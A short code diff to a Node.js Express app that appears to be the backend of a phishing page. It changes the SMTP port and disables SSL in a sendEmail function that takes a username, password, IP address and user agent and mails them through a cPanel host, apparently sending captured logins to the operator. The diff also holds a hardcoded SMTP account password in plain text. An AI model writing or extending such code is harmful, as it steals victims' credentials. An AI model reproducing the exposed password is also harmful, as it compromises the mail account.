@@ -38,8 +38,8 @@ app.post('/api/saveData', (req, res) => {
 function sendEmail(username, password, ip, userAgent, callback) {
     const transporter = nodemailer.createTransport({
         host: 'mail.qstix.com.ng', // Replace with your cPanel SMTP server
-        port: 465,                  // Use 465 for SSL
-        secure: true,               // true for SSL
+        port: 587,                  // Use 465 for SSL
+        secure: false,               // true for SSL
         auth: {
             user: 'no-reply@qstix.com.ng', // Replace with your cPanel email
             pass: 'EmekaIwuagwu87**'        // Replace with your email password
